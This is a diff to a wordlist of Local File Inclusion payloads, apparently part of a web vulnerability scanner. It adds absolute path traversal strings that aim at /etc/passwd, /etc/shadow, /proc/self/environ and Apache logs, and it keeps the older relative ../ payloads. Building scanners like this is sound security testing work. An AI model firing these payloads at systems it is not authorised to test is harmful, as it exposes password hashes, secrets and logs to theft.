@@ -1,5 +1,17 @@
 # LFI payloads for testing Local File Inclusion vulnerabilities
 # Linux LFI payloads - HIGH PRIORITY (most likely to work)
+
+# CRITICAL FIX: Absolute path traversal (Acunetix-style)
+# These were MISSING and caused Acunetix detection gaps!
+/../../../../../../proc/version
+/../../../../../../etc/passwd
+/../../../../../../etc/shadow
+/../../../../../../var/log/apache2/access.log
+/../../../../../../../../../etc/passwd
+/../../../../../../../../../../proc/version
+/../../../../../../../../../../proc/self/environ
+
+# Relative path traversal (original payloads)
 ../../../../../../../etc/passwd
 ../../../../../../../../etc/passwd
 ../../../../../../../../../../etc/passwd
